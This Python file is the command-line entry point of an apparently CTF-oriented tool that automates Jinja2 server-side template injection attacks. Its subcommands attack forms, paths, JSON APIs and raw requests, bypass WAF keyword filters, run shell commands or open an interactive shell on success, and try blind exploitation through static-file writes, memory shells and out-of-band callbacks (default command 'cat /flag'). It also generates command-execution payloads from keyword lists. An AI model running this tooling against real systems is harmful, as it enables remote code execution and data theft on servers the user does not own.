"""命令行界面的入口"""

import ast
import json
import logging
import random
import string
import time
from urllib.parse import urlparse
from typing import List, Dict, Tuple, Union, Any
from enum import Enum
from pathlib import Path


from rich.markup import escape as rich_escape
from rich.logging import RichHandler
import click

from .const import (
    DetectMode,
    TemplateEnvironment,
    PythonVersion,
    ReplacedKeywordStrategy,
    DetectWafKeywords,
    FindFlag,
    DEFAULT_USER_AGENT,
)
from .form import Form, get_form
from .full_payload_gen import FullPayloadGen
from .requester import (
    HTTPRequester,
    TCPRequester,
    check_line_break,
    fix_line_break,
    check_tail,
    fix_tail,
)
from .submitter import (
    FormSubmitter,
    shell_tamperer,
)
from .options import Options
from .pbar import console
from .job import (
    Job,
    FormCrackContext,
    FormEvalArgsContext,
    PathCrackContext,
    JsonCrackContext,
    ScanContext,
    RequestCrackContext,
    RunFailed,
)

TITLE = r"""
    ____             _ _
   / __/__  ____    (_|_)___  ____ _
  / /_/ _ \/ __ \  / / / __ \/ __ `/
 / __/  __/ / / / / / / / / / /_/ /
/_/  \___/_/ /_/_/ /_/_/ /_/\__, /
              /___/        /____/

    ------Made with passion by Marven11
"""


LOGGING_FORMAT = "[bright_black bold]\\[%(levelname)s][/] | %(message)s"

logger = logging.getLogger("cli")


class EnumOption(click.Option):
    """Make click prints more readable prompt for Enum.
    Provide better hint when user input is wrong"""

    def type_cast_value(self, ctx: click.Context, value: Any):
        # Enum class is a callable, so click converts it to FuncParamType
        if not isinstance(self.type, click.types.FuncParamType):
            raise RuntimeError("This should be used on Enum!")
        clazz: type = self.type.func  # type: ignore
        if not issubclass(clazz, Enum):
            raise RuntimeError("This should be used on Enum!")
        try:
            _ = self.type(value)
        except Exception as exc:
            raise click.exceptions.BadParameter(
                f"{repr(value)} must be one of {[x.value for x in clazz]}",
                ctx=ctx,
                param=self,
            ) from exc
        return super().type_cast_value(ctx, value)


def load_keywords_dotpy_safe(content: str) -> List[str]:
    """安全地从.py文件中读取关键字列表，不使用eval
    自动寻找文件中最长的列表表达式并读取

    Args:
        content (str): 文件内容

    Returns:
        List[str]: 关键字的列表
    """
    tree = ast.parse(content)
    list_nodes: List[ast.List] = [
        node for node in ast.walk(tree) if isinstance(node, ast.List)
    ]
    lists: List[List[str]] = [
        [
            item.value
            for item in node.elts
            if isinstance(item, ast.Constant) and isinstance(item.value, str)
        ]
        for node in list_nodes
    ]
    if not lists:
        raise ValueError("Can't find any list of string in the file")
    result = max(lists, key=len)
    if not result:
        logger.warning(
            "[red bold] Keyword list is empty. "
            "What kind of WAF are you want to bypass?",
            extra={"markup": True, "highlighter": None},
        )
        time.sleep(5)
        logger.info(
            "Anyway...",
            extra={"markup": True, "highlighter": None},
        )
        time.sleep(1)
    return result


def parse_headers_cookies(headers_list: List[str], cookies: str) -> Dict[str, str]:
    """将headers列表和cookie字符串解析为可以传给requests的字典

    Args:
        headers_list (List[str]): headers列表，元素的格式为'Key: value'
        cookies (str): Cookie字符串

    Returns:
        Dict[str, str]: Headers字典
    """
    headers = {}
    if headers_list:
        for header in headers_list:
            key, _, value = header.partition(": ")
            if not key or not value:
                logger.warning(
                    "Failed parsing %s, ignored.",
                    repr(header),
                    extra={"highlighter": None},
                )
                continue
            if key.capitalize() != key:
                logger.warning(
                    "Header %s is not capitalized, fixed.",
                    key,
                    extra={"highlighter": None},
                )
                key = key.capitalize()
            headers[key] = value
    if cookies:
        headers["Cookie"] = cookies
    return headers


def is_form_has_response(
    url: str,
    form: Form,
    requester: HTTPRequester,
    tamper_cmd: Union[str, None],
) -> bool:
    """初步判断一个表单是否有可能可以SSTI的参数

    Args:
        url (str): 目标URL
        form (Form): 目标表单
        requester (HTTPRequester): 用于发送请求的requester
        options (Options): 有关攻击的各个选项
        tamper_cmd (Union[str, None]): 对payload进行修改的修改命令

    Returns:
        bool: 是否可能有SSTI的参数
    """
    for input_field in form["inputs"]:
        submitter = FormSubmitter(
            url,
            form,
            input_field,
            requester,
        )
        if tamper_cmd:
            tamperer = shell_tamperer(tamper_cmd)
            submitter.add_tamperer(tamperer)

        marker = "".join(random.choices(string.ascii_lowercase, k=4))
        result1 = submitter.submit(marker)
        musterror_result = [
            submitter.submit(pattern + marker)
            for pattern in [
                "{{",
                "{%",
                "{#",
            ]
        ]
        if (
            result1 is not None
            and marker in result1.text
            and any(
                marker not in result.text
                for result in musterror_result
                if result is not None
            )
        ):
            return True

    return False


common_options_cli = [
    click.option(
        "--exec-cmd",
        "-e",
        default="",
        help="成功后执行的shell指令，不填则成功后进入交互模式",
    ),
    click.option(
        "--detect-mode",
        type=DetectMode,
        cls=EnumOption,
        default=DetectMode.ACCURATE,
        help="分析模式，可为accurate或fast",
    ),
    click.option(
        "--replaced-keyword-strategy",
        default=ReplacedKeywordStrategy.AVOID,
        type=ReplacedKeywordStrategy,
        cls=EnumOption,
        help="WAF替换关键字时的策略，可为avoid/ignore/doubletapping",
    ),
    click.option(
        "--environment",
        default=TemplateEnvironment.JINJA2,
        type=TemplateEnvironment,
        cls=EnumOption,
        help="模板的执行环境，默认为不带flask全局变量的普通jinja2",
    ),
    click.option(
        "--detect-waf-keywords",
        type=DetectWafKeywords,
        cls=EnumOption,
        default=DetectWafKeywords.NONE,
        help="是否枚举被waf的关键字，需要额外时间，默认为none, 可选full/fast",
    ),
    click.option(
        "--find-flag",
        type=FindFlag,
        cls=EnumOption,
        default=FindFlag.AUTO,
        help="是否自动寻找flag，默认只在WAF较好绕过时自动寻找flag",
    ),
    click.option(
        "--waf-keyword",
        default=[],
        multiple=True,
        help="手动指定waf页面含有的关键字，此时不会自动检测waf页面的哈希等。可指定多个关键字",
    ),
    click.option(
        "--tamper-cmd",
        default="",
        help="在发送payload之前进行编码的命令，默认不进行额外操作",
    ),
    click.option("--interval", default=0.0, help="每次请求的间隔"),
]

common_options_http = [
    click.option("--url", "-u", required=True, help="需要攻击的URL"),
    click.option(
        "--user-agent", default=DEFAULT_USER_AGENT, help="请求时使用的User Agent"
    ),
    click.option("--header", default=[], multiple=True, help="请求时使用的Headers"),
    click.option("--cookies", default="", help="请求时使用的Cookie"),
    click.option("--extra-params", default=None, help="请求时的额外GET参数，如a=1&b=2"),
    click.option("--extra-data", default=None, help="请求时的额外POST参数，如a=1&b=2"),
    click.option("--proxy", default="", help="请求时使用的代理"),
    click.option("--no-verify-ssl", default=False, is_flag=True, help="不验证SSL证书"),
]


def add_options(options):
    """应用列表中的click option装饰器"""

    def decorator(f):
        for option in options:
            f = option(f)
        return f

    return decorator


@click.group()
@click.option("--silent", "--shutup", is_flag=True, default=False, help="不打印INFO等")
def main(silent=False):
    """click的命令组"""
    if not silent:
        console.print(f"[yellow bold]{rich_escape(TITLE)}[/]")
    logging.basicConfig(
        level=logging.INFO if not silent else logging.ERROR,
        format=LOGGING_FORMAT,
        datefmt="[%X]",
        handlers=[
            RichHandler(
                show_level=False,
                console=console,
                markup=True,
                show_time=False,
                show_path=False,
                keywords=[],
            )
        ],
    )


@main.command()
@add_options(common_options_http)
@add_options(common_options_cli)
@click.option(
    "--action",
    "-a",
    default=None,
    help="参数的提交路径，如果和URL中的路径不同则需要填入",
)
@click.option("--method", "-m", default="POST", help="参数的提交方式，默认为POST")
@click.option("--inputs", "-i", required=True, help="所有参数，以逗号分隔")
@click.option(
    "--eval-args-payload",
    default=False,
    is_flag=True,
    help="是否开启在GET参数中传递Eval payload的功能",
)
def crack(
    url: str,
    action: str,
    method: str,
    inputs: str,
    exec_cmd: str,
    interval: float,
    detect_mode: DetectMode,
    replaced_keyword_strategy: ReplacedKeywordStrategy,
    environment: TemplateEnvironment,
    detect_waf_keywords: DetectWafKeywords,
    find_flag: FindFlag,
    waf_keyword: List[str],
    eval_args_payload: bool,
    user_agent: str,
    header: tuple,
    cookies: str,
    extra_params: str,
    extra_data: str,
    proxy: str,
    no_verify_ssl: bool,
    tamper_cmd: str,
):
    """
    攻击指定的表单
    """

    assert all(param is not None for param in [url, inputs]), "Please check your param"
    form = get_form(
        action=action or urlparse(url).path,
        method=method,
        inputs=inputs.split(","),
    )
    requester = HTTPRequester(
        interval=interval,
        user_agent=user_agent,
        headers=parse_headers_cookies(headers_list=list(header), cookies=cookies),
        extra_params_querystr=extra_params,
        extra_data_querystr=extra_data,
        proxy=proxy,
        no_verify_ssl=no_verify_ssl,
    )
    # 创建选项对象
    options = Options(
        detect_mode=detect_mode,
        replaced_keyword_strategy=replaced_keyword_strategy,
        environment=environment,
        detect_waf_keywords=detect_waf_keywords,
        waf_keywords=waf_keyword,
    )

    if not eval_args_payload:
        context = FormCrackContext(
            url=url,
            form=form,
            requester=requester,
            options=options,
            tamper_cmd=tamper_cmd,
        )
    else:
        context = FormEvalArgsContext(
            url=url,
            form=form,
            requester=requester,
            options=options,
            tamper_cmd=tamper_cmd,
        )

    job = Job(context)
    if not job.do_crack_pre():
        logger.warning("Test form failed...", extra={"highlighter": None})
        raise RunFailed()
    job.do_crack(exec_cmd, find_flag)


@main.command()
@add_options(common_options_http)
@add_options(common_options_cli)
def crack_path(
    url: str,
    exec_cmd: str,
    interval: float,
    detect_mode: DetectMode,
    replaced_keyword_strategy: ReplacedKeywordStrategy,
    environment: TemplateEnvironment,
    detect_waf_keywords: DetectWafKeywords,
    find_flag: FindFlag,
    waf_keyword: List[str],
    user_agent: str,
    header: tuple,
    cookies: str,
    extra_params: str,
    extra_data: str,
    proxy: str,
    no_verify_ssl: bool,
    tamper_cmd: str,
):
    """
    攻击指定的路径
    """
    assert url is not None, "Please provide URL!"

    requester = HTTPRequester(
        interval=interval,
        user_agent=user_agent,
        headers=parse_headers_cookies(headers_list=list(header), cookies=cookies),
        extra_params_querystr=extra_params,
        extra_data_querystr=extra_data,
        proxy=proxy,
        no_verify_ssl=no_verify_ssl,
    )
    options = Options(
        detect_mode=detect_mode,
        replaced_keyword_strategy=replaced_keyword_strategy,
        environment=environment,
        detect_waf_keywords=detect_waf_keywords,
        waf_keywords=waf_keyword,
    )
    context = PathCrackContext(
        url=url,
        requester=requester,
        options=options,
        tamper_cmd=tamper_cmd,
    )
    job = Job(context)
    if not job.do_crack_pre():
        logger.warning("Test form failed...", extra={"highlighter": None})
        raise RunFailed()
    job.do_crack(exec_cmd, find_flag)


@main.command()
@add_options(common_options_http)
@add_options(common_options_cli)
@click.option("--method", "-m", default="POST", help="JSON的提交方式，默认为POST")
@click.option("--json-data", required=True, help="json数据")
@click.option("--key", required=True, help="攻击的键")
def crack_json(
    url: str,
    method: str,
    json_data: str,
    key: str,
    exec_cmd: str,
    interval: float,
    detect_mode: DetectMode,
    replaced_keyword_strategy: ReplacedKeywordStrategy,
    environment: TemplateEnvironment,
    detect_waf_keywords: DetectWafKeywords,
    find_flag: FindFlag,
    waf_keyword: List[str],
    user_agent: str,
    header: tuple,
    cookies: str,
    extra_params: str,
    extra_data: str,
    proxy: str,
    no_verify_ssl: bool,
    tamper_cmd: str,
):
    """
    攻击指定的JSON API
    """

    assert url is not None, "Please check your param"
    requester = HTTPRequester(
        interval=interval,
        user_agent=user_agent,
        headers=parse_headers_cookies(headers_list=list(header), cookies=cookies),
        extra_params_querystr=extra_params,
        extra_data_querystr=extra_data,
        proxy=proxy,
        no_verify_ssl=no_verify_ssl,
    )
    options = Options(
        detect_mode=detect_mode,
        replaced_keyword_strategy=replaced_keyword_strategy,
        environment=environment,
        detect_waf_keywords=detect_waf_keywords,
        waf_keywords=waf_keyword,
    )
    context = JsonCrackContext(
        url=url,
        method=method,
        json_data=json_data,
        key=key,
        requester=requester,
        options=options,
        tamper_cmd=tamper_cmd,
    )
    job = Job(context)
    if not job.do_crack_pre():
        logger.warning("Test form failed...", extra={"highlighter": None})
        raise RunFailed()
    job.do_crack(exec_cmd, find_flag)


@main.command()
@add_options(common_options_http)
@add_options(common_options_cli)
def scan(
    url: str,
    exec_cmd: str,
    interval: float,
    detect_mode: DetectMode,
    replaced_keyword_strategy: ReplacedKeywordStrategy,
    environment: TemplateEnvironment,
    detect_waf_keywords: DetectWafKeywords,
    find_flag: FindFlag,
    waf_keyword: List[str],
    user_agent: str,
    header: tuple,
    cookies: str,
    extra_params: str,
    extra_data: str,
    proxy: str,
    no_verify_ssl: bool,
    tamper_cmd: str,
):
    """
    扫描指定的网站
    """

    requester = HTTPRequester(
        interval=interval,
        user_agent=user_agent,
        headers=parse_headers_cookies(headers_list=list(header), cookies=cookies),
        extra_params_querystr=extra_params,
        extra_data_querystr=extra_data,
        proxy=proxy,
        no_verify_ssl=no_verify_ssl,
    )
    options = Options(
        detect_mode=detect_mode,
        replaced_keyword_strategy=replaced_keyword_strategy,
        environment=environment,
        detect_waf_keywords=detect_waf_keywords,
        waf_keywords=waf_keyword,
    )
    context = ScanContext(
        url=url,
        requester=requester,
        options=options,
        tamper_cmd=tamper_cmd,
    )
    job = Job(context)
    if not job.do_crack_pre():
        logger.warning("Scan failed...", extra={"highlighter": None})
        logger.warning(
            "Try to pass params manualy: "
            + "python -m fenjing crack %s --inputs aaa,bbb --method GET",
            url,
            extra={"highlighter": None},
        )
        raise RunFailed()
    job.do_crack(exec_cmd, find_flag)


@main.command()
@add_options(common_options_cli)
@click.option("--host", "-h", required=True, help="目标的host，可为IP或域名")
@click.option("--port", "-p", required=True, type=int, help="目标的端口")
@click.option(
    "--request-file",
    "-f",
    required=True,
    help="保存在文本文件中的请求，其中payload处为PAYLOAD",
)
@click.option(
    "--toreplace", default=b"PAYLOAD", type=bytes, help="请求文件中payload的占位符"
)
@click.option("--ssl/--no-ssl", default=False, help="是否使用SSL")
@click.option("--urlencode-payload", default=True, help="是否对payload进行urlencode")
@click.option("--raw", is_flag=True, default=False, help="不检查请求的换行符等")
@click.option("--retry-times", default=5, help="重试次数")
@click.option("--update-content-length", default=True, help="自动更新Content-Length")
def crack_request(
    host: str,
    port: int,
    request_file: str,
    toreplace: bytes,
    ssl: bool,
    exec_cmd: str,
    urlencode_payload: bool,
    raw: bool,
    detect_mode: DetectMode,
    replaced_keyword_strategy: ReplacedKeywordStrategy,
    environment: TemplateEnvironment,
    detect_waf_keywords: DetectWafKeywords,
    find_flag: FindFlag,
    waf_keyword: List[str],
    retry_times: int,
    interval: float,
    tamper_cmd: str,
    update_content_length: bool,
):
    """
    从文本文件中读取请求并攻击目标，文本文件中用`PAYLOAD`标记payload插入位置
    """
    request_filepath = Path(request_file)
    if not request_filepath.is_file():
        logger.error("File doesn't exist: %s", request_filepath)
    request_pattern = request_filepath.read_bytes()
    if not raw and not check_tail(request_pattern):
        logger.warning(
            "Request doesn't ends with '\\r\\n\\r\\n', fixing...",
            extra={"highlighter": None},
        )
        logger.warning(
            "You can use `--raw` flag to disable this", extra={"highlighter": None}
        )
        request_pattern = fix_tail(request_pattern)
        time.sleep(2)
    if not raw and not check_line_break(request_pattern):
        logger.warning(
            "Request's linebreak is not '\\r\\n', fixing...",
            extra={"highlighter": None},
        )
        logger.warning(
            "You can use `--raw` flag to disable this", extra={"highlighter": None}
        )
        request_pattern = fix_line_break(request_pattern)
        time.sleep(2)

    requester = TCPRequester(
        host=host, port=port, use_ssl=ssl, retry_times=retry_times, interval=interval
    )
    options = Options(
        detect_mode=detect_mode,
        replaced_keyword_strategy=replaced_keyword_strategy,
        environment=environment,
        detect_waf_keywords=detect_waf_keywords,
        waf_keywords=waf_keyword,
    )
    context = RequestCrackContext(
        host=host,
        port=port,
        request_file=request_file,
        requester=requester,
        options=options,
        tamper_cmd=tamper_cmd,
        toreplace=toreplace,
        ssl=ssl,
        urlencode_payload=urlencode_payload,
        raw=raw,
        retry_times=retry_times,
        update_content_length=update_content_length,
    )
    job = Job(context)
    if not job.do_crack_pre():
        logger.warning("Crack request failed...", extra={"highlighter": None})
        raise RunFailed()
    job.do_crack(exec_cmd, find_flag)


@main.command()
@add_options(common_options_http)
@click.option(
    "--action",
    "-a",
    default=None,
    help="参数的提交路径，如果和URL中的路径不同则需要填入",
)
@click.option("--method", "-m", default="POST", help="参数的提交方式，默认为POST")
@click.option("--inputs", "-i", required=True, help="所有参数，以逗号分隔")
@click.option(
    "--field",
    default="",
    help="注入的参数字段，默认为inputs中字母序第一个",
)
@click.option(
    "--static-path",
    default="",
    help="静态文件URL前缀，static不挂在默认/static/下时指定（如 /app/static）",
)
@click.option(
    "--oob-callback",
    default="",
    help="OOB手动回调地址（如interactsh-client分配的子域名），不自动验证",
)
@click.option(
    "--oob-server",
    default="",
    help="self-hosted interactsh服务器域名（如 oob.zemu137.online），自动注册轮询验证",
)
@click.option("--oob-cmd", default="cat /flag", help="OOB带外执行的命令")
@click.option(
    "--oob-timeout", default=30, type=int, help="OOB每个payload变体的轮询等待秒数"
)
@click.option("--no-oob", is_flag=True, default=False, help="跳过OOB步骤")
@click.option("--output", "-o", default="", help="把结构化结果保存为JSON文件")
@click.option(
    "--no-interactive", is_flag=True, default=False, help="成功后不进入交互shell"
)
@click.option(
    "--tamper-cmd",
    default="",
    help="在发送payload之前进行编码的命令，默认不进行额外操作",
)
@click.option("--interval", default=0.0, help="每次请求的间隔")
def blind(
    url: str,
    action: str,
    method: str,
    inputs: str,
    field: str,
    static_path: str,
    oob_callback: str,
    oob_server: str,
    oob_cmd: str,
    oob_timeout: int,
    no_oob: bool,
    output: str,
    no_interactive: bool,
    tamper_cmd: str,
    interval: float,
    user_agent: str,
    header: tuple,
    cookies: str,
    extra_params: str,
    extra_data: str,
    proxy: str,
    no_verify_ssl: bool,
):
    """
    无回显（盲）SSTI自动利用：写static/内存马/错误页/Server头/OOB逐步尝试
    """
    from .blind import run_blind

    assert all(param is not None for param in [url, inputs]), "Please check your param"
    form = get_form(
        action=action or urlparse(url).path,
        method=method,
        inputs=inputs.split(","),
    )
    input_field = field or sorted(form["inputs"])[0]
    if len(form["inputs"]) > 1 and not field:
        logger.warning(
            "[yellow]表单有多个字段 %s，未指定--field，默认使用 [blue]%s[/][/]",
            sorted(form["inputs"]),
            input_field,
            extra={"markup": True, "highlighter": None},
        )
    requester = HTTPRequester(
        interval=interval,
        user_agent=user_agent,
        headers=parse_headers_cookies(headers_list=list(header), cookies=cookies),
        extra_params_querystr=extra_params,
        extra_data_querystr=extra_data,
        proxy=proxy,
        no_verify_ssl=no_verify_ssl,
    )
    options = Options()
    step = run_blind(
        url=url,
        form=form,
        input_field=input_field,
        requester=requester,
        options=options,
        tamper_cmd=tamper_cmd,
        interactive=not no_interactive,
        do_oob=not no_oob,
        oob_callback=oob_callback,
        oob_server=oob_server,
        oob_cmd=oob_cmd,
        oob_timeout=oob_timeout,
        static_path=static_path,
        output=output,
    )
    if not step:
        raise RunFailed()


def interactive_impl():
    """交互式引导攻击的实现：询问目标信息后选择echo/blind/auto模式"""
    from .blind import run_blind

    console.print("[cyan bold]进入交互式模式[/]")
    url = click.prompt("目标URL", type=str)
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    method = click.prompt(
        "HTTP方法",
        type=click.Choice(["GET", "POST"], case_sensitive=False),
        default="POST",
    ).upper()
    inputs = click.prompt("注入参数字段（多个以逗号分隔）", type=str, default="code")
    action = click.prompt(
        "参数的提交路径（留空则使用URL中的路径）", default="", show_default=False
    )
    cookies = click.prompt("Cookie（留空跳过）", default="", show_default=False)
    header_input = click.prompt(
        "Header（格式 'Key: value'，多个用 ';;' 分隔，留空跳过）",
        default="",
        show_default=False,
    )
    proxy = click.prompt(
        "代理（如 http://127.0.0.1:8080，留空跳过）", default="", show_default=False
    )
    mode = click.prompt(
        "攻击模式（echo=有回显, blind=无回显, auto=自动探测）",
        type=click.Choice(["echo", "blind", "auto"]),
        default="auto",
    )

    form = get_form(
        action=action or urlparse(url).path,
        method=method,
        inputs=inputs.split(","),
    )
    input_field = sorted(form["inputs"])[0]
    headers = parse_headers_cookies(
        headers_list=[h.strip() for h in header_input.split(";;") if h.strip()],
        cookies=cookies,
    )
    requester = HTTPRequester(headers=headers, proxy=proxy or None)
    options = Options()

    if mode == "auto":
        # 用随机两位数乘法降低误判（页面本身含49之类固定数字时不会误判）
        num1, num2 = random.randint(10, 99), random.randint(10, 99)
        probe = "{{%d*%d}}" % (num1, num2)
        expected = str(num1 * num2)
        echo_field = ""
        fields = sorted(form["inputs"])
        if len(fields) > 1:
            console.print(
                f"[yellow]表单有多个字段 {fields}，将逐个探测哪个字段有回显...[/]"
            )
        for field_name in fields:
            submitter = FormSubmitter(url, form, field_name, requester)
            resp = submitter.submit(probe)
            if resp is not None and expected in resp.text:
                echo_field = field_name
                break
        if echo_field:
            input_field = echo_field
            mode = "echo"
        else:
            mode = "blind"
            if len(fields) > 1:
                console.print(
                    f"[yellow]所有字段都无回显，blind模式默认使用字段 "
                    f"[cyan bold]{input_field}[/]，"
                    f"若不对请改用 fenjing blind --field 指定[/]"
                )
        console.print(
            f"[yellow]自动探测结果：目标{'有' if echo_field else '无'}回显，"
            f"使用 [cyan bold]{mode}[/] 模式[/]"
        )

    if mode == "echo":
        context = FormCrackContext(
            url=url,
            form=form,
            requester=requester,
            options=options,
        )
        job = Job(context)
        if not job.do_crack_pre():
            logger.warning("Test form failed...", extra={"highlighter": None})
            raise RunFailed()
        job.do_crack(None, FindFlag.AUTO)
    else:
        run_blind(
            url=url,
            form=form,
            input_field=input_field,
            requester=requester,
            options=options,
        )


@main.command(name="interactive")
def interactive_cmd():
    """
    交互式引导攻击，支持有回显(echo)/无回显(blind)/自动探测(auto)模式
    """
    interactive_impl()


@main.command(name="i")
def interactive_alias():
    """
    interactive的简写，交互式引导攻击
    """
    interactive_impl()


@main.command()
@click.option(
    "--keywords-file",
    "-k",
    required=True,
    help="保存着所有关键字的文件，可为.txt, .py或.json",
)
@click.option(
    "--output-file",
    "-o",
    default="",
    help="输出文件，后缀名一般为.jinja2，不填则直接print",
)
@click.option(
    "--command",
    "-c",
    required=True,
    help="需要执行的shell指令",
)
@click.option(
    "--suffix",
    default="",
    help="手动指定关键字文件的后缀，默认按照文件原本的后缀名读取",
)
@click.option(
    "--detect-mode",
    type=DetectMode,
    cls=EnumOption,
    default=DetectMode.ACCURATE,
    help="分析模式，可为accurate或fast",
)
@click.option(
    "--replaced-keyword-strategy",
    default=ReplacedKeywordStrategy.AVOID,
    type=ReplacedKeywordStrategy,
    cls=EnumOption,
    help="WAF替换关键字时的策略，可为avoid/ignore/doubletapping",
)
@click.option(
    "--environment",
    default=TemplateEnvironment.JINJA2,
    type=TemplateEnvironment,
    cls=EnumOption,
    help="模板的执行环境，默认为不带flask全局变量的普通jinja2",
)
@click.option(
    "--python-version",
    default=PythonVersion.PYTHON3,
    type=PythonVersion,
    cls=EnumOption,
    help="目标的python版本为python2/python3，默认为python3",
)
@click.option(
    "--python-subversion",
    default=6,
    type=int,
    help="目标的python小版本，默认为6(python3.6)",
)
def crack_keywords(
    keywords_file: str,
    output_file: str,
    command: str,
    suffix: str,
    detect_mode: DetectMode,
    replaced_keyword_strategy: ReplacedKeywordStrategy,
    environment: TemplateEnvironment,
    python_version: PythonVersion,
    python_subversion: int,
):
    """根据关键字生成对应的payload"""
    keywords_path = Path(keywords_file)
    output_path = Path(output_file) if output_file else None
    if not keywords_path.exists():
        logger.error(
            "File [blue]%s[/] [red bold]Not Exists![/]",
            rich_escape(keywords_file),
            extra={"markup": True, "highlighter": None},
        )
        raise FileNotFoundError(keywords_file)
    if not suffix:
        suffix = keywords_path.suffix
    if suffix == ".json":
        waf_keywords: List = json.loads(keywords_path.read_text())
    elif suffix == ".py":
        try:
            waf_keywords: List = load_keywords_dotpy_safe(keywords_path.read_text())
        except SyntaxError as e:
            logger.error(
                "Syntax error, check your %s",
                keywords_file,
                extra={"highlighter": None},
            )
            raise e
    else:
        if suffix != ".txt":
            logger.warning("Unknown suffix %s, handle it as .txt", suffix)
        waf_keywords: List = keywords_path.read_text().strip().split("\n")
    logger.info(
        "Waf keywords are [blue]%s[/]",
        rich_escape(repr(waf_keywords)),
        extra={"markup": True, "highlighter": None},
    )
    options = Options(
        detect_mode=detect_mode,
        environment=environment,
        replaced_keyword_strategy=replaced_keyword_strategy,
        python_version=python_version,
        python_subversion=python_subversion,
        waf_keywords=waf_keywords,
    )
    full_payload_gen = FullPayloadGen(
        waf_func=lambda x: all(keyword not in x for keyword in waf_keywords),
        callback=None,
        options=options,
    )
    payload, will_print = full_payload_gen.generate("os_popen_read", command)
    if payload is None or will_print is None:
        logger.error(
            "Generate [yellow]%s[/] failed...",
            rich_escape(command),
            extra={"markup": True, "highlighter": None},
        )
        raise RunFailed()
    if not will_print:
        logger.warning(
            "This payload has [red]No Output[/]! We won't see anything!",
            extra={"markup": True, "highlighter": None},
        )
    if output_path:
        output_path.write_text(payload)
        logger.info(
            "[cyan bold]Done![/] Payload is written into [blue]%s[/]",
            rich_escape(output_path.as_posix()),
            extra={"markup": True, "highlighter": None},
        )
    else:
        print(payload, end="")  # don't print new line for base64


if __name__ == "__main__":
    main()
